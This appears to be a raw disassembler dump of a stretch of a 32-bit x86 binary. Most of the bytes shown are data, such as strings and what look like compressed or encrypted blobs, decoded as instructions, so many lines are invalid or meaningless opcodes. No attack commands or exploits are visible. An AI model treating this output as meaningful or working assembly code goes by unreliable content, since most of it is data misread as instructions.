  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	xor    eax,0x68720043
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    BYTE PTR [ebx+0x0],al
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [eax]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi-0x7935abec]
  413ea4:	cmp    DWORD PTR [ebx-0x13],0x70000ce
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [ebp-0x65b27c0],bl
  413eb3:	dec    edx
  413eb4:	scas   eax,DWORD PTR es:[edi]
  413eb5:	in     eax,dx
  413eb6:	mov    ch,0xf6
  413eb8:	push   esp
  413eb9:	jbe    0x413ea5
  413ebb:	jns    0x413f31
  413ebd:	pop    edx
  413ebe:	pop    esp
  413ebf:	and    BYTE PTR ds:0x168d6e12,0x3e
  413ec6:	cmp    cl,BYTE PTR [ebp-0x62]
  413ec9:	out    dx,eax
  413eca:	int3   
  413ecb:	jle    0x413e9e
  413ecd:	jl     0x413f32
  413ecf:	sbb    eax,0x2298f3bf
  413ed4:	or     bl,BYTE PTR [ebx]
  413ed6:	cmp    ebx,DWORD PTR [edx]
  413ed8:	or     BYTE PTR [edx+ebp*2],dh
  413edb:	jne    0x413f53
  413edd:	inc    edx
  413ede:	xlat   BYTE PTR ds:[ebx]
  413edf:	jp     0x413e74
  413ee1:	jmp    0x8b521f86
  413ee6:	cmp    DWORD PTR [ebx+0x7c],esi
  413ee9:	pusha  
  413eea:	stos   BYTE PTR es:[edi],al
  413eeb:	(bad)  
  413eed:	and    al,0x4e
  413eef:	test   dh,cl
  413ef1:	inc    ebp
  413ef2:	inc    ecx
  413ef3:	jo     0x413f60
  413ef5:	mov    BYTE PTR [ecx+0x63],ch
  413ef8:	jbe    0x413f3d
  413efa:	mov    BYTE PTR [ebp+0x1],bl
  413efd:	pop    esi
  413efe:	push   edx
  413eff:	out    dx,eax
  413f00:	ja     0x413ef2
  413f02:	push   ds
  413f03:	and    eax,0xd4ce1433
  413f08:	jns    0x413ed5
  413f0a:	inc    edi
  413f0b:	int    0x6
  413f0d:	(bad)  
  413f0e:	jbe    0x413f28
  413f10:	mov    DWORD PTR [edi+esi*4],eax
  413f13:	add    dl,dh
  413f15:	fdiv   st(2),st
  413f17:	hlt    
  413f18:	sub    DWORD PTR [ebx+esi*4+0xf5d8110],0xffffffc9
  413f20:	jl     0x413f99
  413f22:	mov    ebp,DWORD PTR ds:0x89726631
  413f28:	xchg   edx,eax
  413f29:	mov    esi,0x58522973
  413f2e:	call   0xd66f75f0
  413f33:	ret    0x8b5a
  413f36:	jecxz  0x413f8e
  413f38:	(bad)  
  413f3a:	das    
  413f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3c:	and    BYTE PTR [edi],dh
  413f3e:	push   ebp
  413f3f:	mov    esp,0xc79b9fa
  413f44:	mov    ebp,0x3d1d8363
  413f49:	pop    ebx
  413f4a:	in     eax,dx
  413f4b:	mov    dl,BYTE PTR [esi-0x5502d6bd]
  413f51:	mov    ecx,0xe56489d0
  413f56:	and    dh,BYTE PTR [edi]
  413f58:	mov    al,0xf
  413f5a:	popa   
  413f5b:	(bad)
  413f5e:	sbb    DWORD PTR [edi],edx
  413f60:	mov    cl,0xad
  413f62:	or     cl,ah
  413f64:	stc    
  413f65:	adc    BYTE PTR [edx-0x7f9a2658],cl
  413f6b:	shl    BYTE PTR [esi],1
  413f6d:	pop    ebx
  413f6e:	mov    ecx,0xcee37bb5
  413f73:	adc    esi,DWORD PTR [ebx]
  413f75:	sbb    al,0x2a
  413f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f78:	out    dx,al
  413f79:	xchg   edx,eax
  413f7a:	pop    es
  413f7b:	call   0x1e609d0c
  413f80:	outs   dx,DWORD PTR ds:[esi]
  413f81:	pusha  
  413f82:	or     BYTE PTR [ebp-0x599be0c3],0xec
  413f89:	mov    ebx,0xd6ddd7dd
  413f8e:	repnz mov edi,0xef52bacc
  413f94:	cli    
  413f95:	(bad)  
  413f96:	hlt    
  413f97:	shl    BYTE PTR [edx-0x1d8c8b1c],0xf7
  413f9e:	adc    DWORD PTR ds:0xe3e84058,esp
  413fa4:	enter  0xfe89,0x79
  413fa8:	jae    0x413fd2
  413faa:	shl    DWORD PTR [bx+di-0x68],0x53
  413faf:	inc    esi
  413fb0:	xchg   DWORD PTR [esi+eax*2],ebp
  413fb3:	loope  0x413f73
	...
  414015:	add    BYTE PTR [edx-0x26],bl
  414018:	push   esi
  414019:	pusha  
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x721882f9
  414025:	mov    al,0xf4
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [esi-0x482ef674],cl
  414033:	jmp    0x414072
  414035:	jns    0x413fcd
  414037:	shr    BYTE PTR [eax+0x713baa92],cl
  41403d:	mov    esp,0xf4466f60
  414042:	and    ch,BYTE PTR [eax+0x6bf5e160]
  414048:	xlat   BYTE PTR ds:[ebx]
  414049:	jle    0x414038
  41404b:	dec    ecx
  41404c:	enter  0x235f,0xc5
  414050:	jno    0x4140c5
  414052:	cmp    ebx,eax
  414054:	in     eax,dx
  414055:	loop   0x41404d
  414057:	idiv   BYTE PTR [ecx-0x1e67cf86]
  41405d:	rol    BYTE PTR [edx+0x1a],cl
  414060:	jl     0x4140b9
  414062:	sbb    eax,0xbc2a2543
  414067:	xacquire xchg DWORD PTR [edi+edx*4],edx
  41406b:	jg     0x413ff3
  41406d:	shl    BYTE PTR [edx-0xb],cl
  414070:	(bad)  
  414071:	shl    DWORD PTR [esi+0x3],1
  414074:	aaa    
  414075:	fimul  DWORD PTR [esi+eax*8-0xd6a1014]
  41407c:	and    al,0x5e
  41407e:	push   ss
  41407f:	dec    ebx
  414080:	mov    esp,0xb6ee750d
  414085:	test   al,0xfb
  414087:	dec    edx
  414088:	fwait
  414089:	xor    DWORD PTR [esi],esp
  41408b:	inc    ebx
  41408c:	in     al,dx
  41408d:	aad    0xda
  41408f:	and    al,0x28
  414091:	fist   DWORD PTR [edx]
  414093:	mov    ecx,0xc41eb97a
  414098:	data16 loop 0x41405b
  41409b:	mov    dl,0x69
  41409d:	push   0x6
  41409f:	popf   
  4140a0:	nop
  4140a1:	leave  
  4140a2:	xchg   esi,eax
  4140a3:	mov    ebx,ebp
  4140a5:	or     al,dl
  4140a7:	or     al,0xaa
  4140a9:	sbb    eax,0xc8909c38
  4140ae:	data16 jns 0x4140b1
  4140b1:	imul   ecx,edi,0x66ed6f14
  4140b7:	xor    BYTE PTR [ecx],bh
  4140b9:	int3   
  4140ba:	add    DWORD PTR [eax],0xffffffb7
  4140bd:	hlt    
  4140be:	sbb    DWORD PTR [edx+ebx*1-0x4b],0xffffffa1
  4140c3:	add    eax,0x5a69f33b
  4140c8:	fs sbb eax,0x79ab1dc6
  4140ce:	and    esi,DWORD PTR [esi]
  4140d0:	dec    esp
  4140d1:	mov    cl,0x82
  4140d3:	out    0xe7,eax
  4140d5:	mov    ebp,0x27cee81b
  4140da:	loope  0x4140db
  4140dc:	push   esi
  4140dd:	mov    edx,0x9463021b
  4140e2:	or     bh,BYTE PTR [edx]
  4140e4:	ins    DWORD PTR es:[edi],dx
  4140e5:	mov    edi,DWORD PTR [ebp-0x5e]
  4140e8:	(bad)  
  4140e9:	sahf   
  4140ea:	fiadd  WORD PTR [ecx-0x2684150e]
  4140f0:	sbb    DWORD PTR [ebp-0x52a95d69],0x28
  4140f7:	pusha  
  4140f8:	push   esi
  4140f9:	dec    eax
  4140fa:	mov    ebp,0xaf5fd836
  4140ff:	xor    BYTE PTR [edx+0x77],0x6c
  414103:	and    esi,esi
  414105:	pop    ss
  414106:	nop
  414107:	fist   DWORD PTR [ebp+0xf98880a]
  41410d:	mov    dl,0x93
  41410f:	and    bl,bh
  414111:	pop    ecx
  414112:	aad    0x86
  414114:	lods   eax,DWORD PTR ds:[esi]
  414115:	js     0x4140f1
  414117:	inc    ecx
  414118:	mov    ah,al
  41411a:	adc    BYTE PTR [esi+eiz*4+0x51],ch
  41411e:	xchg   BYTE PTR [esi],cl
  414120:	addr16 mov ebx,0x224d6742
  414126:	aas    
  414127:	bound  ebp,QWORD PTR [ebp+0x58]
  41412a:	push   0xffffff94
  41412c:	jb     0x41415d
  41412e:	out    0x34,eax
  414130:	pop    ebx
  414131:	or     al,0xb3
  414133:	in     al,dx
  414134:	sti    
	...
  414195:	add    BYTE PTR [edx],al
  414197:	adc    al,BYTE PTR [ecx]
  414199:	mov    ds:0xb3a2b311,eax
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x2d325b4
  4141a5:	pop    ebp
  4141a6:	sti    
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    BYTE PTR [ecx+0x44],bl
  4141b0:	aaa    
  4141b1:	psraw  mm7,QWORD PTR [ecx]
  4141b4:	cs ds sbb al,0x38
  4141b8:	adc    ebx,DWORD PTR [eax-0x59]
  4141bb:	bound  eax,QWORD PTR [eax+0x45d7c6a2]
  4141c1:	pop    esi
  4141c2:	mov    esi,0x4df7bcc8
  4141c7:	cmp    eax,DWORD PTR [esi]
  4141c9:	fcomip st,st(0)
  4141cb:	imul   esp,DWORD PTR [ebp+0x442750df],0x2619ebd0
  4141d5:	mov    edi,0x2cc49279
  4141da:	in     eax,0x6a
  4141dc:	in     al,dx
  4141dd:	lahf   
  4141de:	lds    esp,FWORD PTR [ecx]
  4141e0:	or     ecx,ecx
  4141e2:	fwait
  4141e3:	mov    bh,0x6
  4141e5:	test   DWORD PTR [esi],0x28dccd44
  4141eb:	stos   BYTE PTR es:[edi],al
  4141ec:	adc    al,BYTE PTR [ebx]
  4141ee:	adc    eax,0x2358df26
  4141f3:	inc    esp
  4141f4:	push   esp
  4141f5:	into   
  4141f6:	mov    edx,0x79016281
  4141fb:	mov    eax,0x4cf5b23
  414200:	dec    ebp
  414201:	cwde   
  414202:	push   ebp
  414203:	(bad)  
  414204:	mov    esi,0xfbd1da5c
  414209:	int    0xfa
  41420b:	sub    dl,BYTE PTR [edi-0x44]
  41420e:	in     al,0xb1
  414210:	xchg   ebp,eax
  414211:	sbb    DWORD PTR [edx],edx
  414213:	xchg   BYTE PTR [esi],dh
  414215:	jl     0x414264
  414217:	pop    eax
  414218:	sub    ah,dh
  41421a:	out    dx,eax
  41421b:	sbb    BYTE PTR [eax+0x43ad94ad],dh
  414221:	call   0x7b792a3c
  414226:	gs jg  0x4141e5
  414229:	int3   
  41422a:	mov    WORD PTR [edx+ecx*2+0x412182e5],ds
  414231:	jmp    0x3847:0x5d8c470c
  414238:	cmp    BYTE PTR [edi],dl
  41423a:	dec    ebx
  41423b:	pop    eax
  41423c:	dec    esi
  41423d:	inc    eax
  41423e:	mov    esp,ebp
  414240:	bound  edi,QWORD PTR [esi+ecx*2+0x66ed5b38]
  414247:	xor    eax,0x40414aa1
  41424c:	gs pop es
  41424e:	aam    0xdf
  414250:	adc    dh,BYTE PTR [ebx-0x65]
  414253:	test   eax,0xcb5067f7
  414258:	cmc    
  414259:	sub    DWORD PTR [eax+0x77],esp
  41425c:	rcl    BYTE PTR [edx-0x2175024c],0x10
  414263:	xor    DWORD PTR [esi+0x6a],edx
  414266:	and    al,0xd9
  414268:	cmc    
  414269:	(bad)  
  41426a:	sbb    BYTE PTR cs:[ebx+0xe],dl
  41426e:	dec    eax
  41426f:	call   0xd102:0x1a38dbc
  414276:	popf   
  414277:	sbb    esp,DWORD PTR [esi-0x43]
  41427a:	sbb    bh,cl
  41427c:	inc    esp
  41427d:	ja     0x414251
  41427f:	mov    es,WORD PTR [ecx-0x5a3276f8]
  414285:	or     al,0x76
  414287:	dec    esi
  414288:	loopne 0x4142ac
  41428a:	xchg   esp,eax
  41428b:	or     al,0xd1
  41428d:	test   cl,bh
  41428f:	fbld   TBYTE PTR ds:0x3d5c9f29
  414295:	repz cs xor ebx,esi
  414299:	imul   eax,esi,0x77
  41429c:	ficomp DWORD PTR [ebp+0x4a]
  41429f:	adc    al,0xde
  4142a1:	jb     0x414266
  4142a3:	rcl    BYTE PTR [edi-0x443c980e],cl
  4142a9:	sti    
  4142aa:	add    BYTE PTR [esi],ch
  4142ac:	mov    esi,0x5b660c5e
  4142b1:	rcr    DWORD PTR [edx+0x8627],0x0
	...
  414314:	add    BYTE PTR [eax],al
  414316:	add    DWORD PTR [ecx-0x2122293],eax
